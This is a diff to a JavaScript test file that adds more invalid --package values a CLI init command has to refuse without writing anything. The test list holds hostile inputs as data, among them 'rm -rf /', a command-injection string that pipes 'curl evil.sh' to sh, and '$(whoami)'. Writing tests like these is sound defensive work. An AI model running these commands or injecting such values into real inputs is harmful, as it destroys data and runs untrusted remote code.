@@ -270,7 +270,7 @@ describe('BRAKE: faf card init — refuses what it must not write', () => {
     });
   }
 
-  for (const pkg of ['rm -rf /', 'pkg; curl evil.sh | sh', '$(whoami)', 'UPPER-Case', '../escape']) {
+  for (const pkg of ['rm -rf /', 'pkg; curl evil.sh | sh', '$(whoami)', 'UPPER-Case', '../escape', '--yes', '-rf', '.hidden', '_private', '@-scope/x']) {
     test(`--package ${JSON.stringify(pkg)}: not an npm package name — refused, nothing written`, async () => {
       const err = await expectExit(2, () => cardInitCommand({ ...WEATHER, url: undefined, package: pkg, dir: t.dir() }));
       expect(err).toContain('npm package name');
